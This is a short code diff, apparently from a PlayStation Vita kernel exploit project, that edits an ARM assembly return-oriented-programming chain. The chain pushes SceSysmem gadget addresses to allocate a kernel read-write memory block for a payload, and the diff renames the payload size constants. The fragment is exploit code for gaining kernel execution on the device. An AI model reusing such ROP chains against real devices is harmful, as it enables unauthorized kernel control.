@@ -50,13 +50,11 @@
 .equ SceSysmem_empty_string,                      0x19
 
 // Variables that lie in the kernel stack
-.equ payload_temp_block,                          0x00
-.equ payload_temp_blockid,                        0x04
-.equ payload_code_block,                          0x08
-.equ payload_code_blockid,                        0x0c
+.equ payload_code_block,                          0x00
+.equ payload_code_blockid,                        0x04
 
-// Max decompressed payload size
-.equ PAYLOAD_DECOMPRESSED_SIZE,                   0x100000
+// Max payload size
+.equ MAX_PAYLOAD_SIZE,                            0x100000
 
 .macro init_krop dst
   .set krop_chain, \dst
@@ -83,7 +81,7 @@
   push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
   push 1, SceSysmem_empty_string                      // r0
   push 0, SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RW          // r1
-  push 0, PAYLOAD_DECOMPRESSED_SIZE                   // r2
+  push 0, MAX_PAYLOAD_SIZE                   // r2
   push 0, NULL                                        // r3
   push 1, SceSysmem_ksceKernelAllocMemBlock           // r4
   push 1, SceSysmem_blx_r4_pop_r4_pc                  // pc
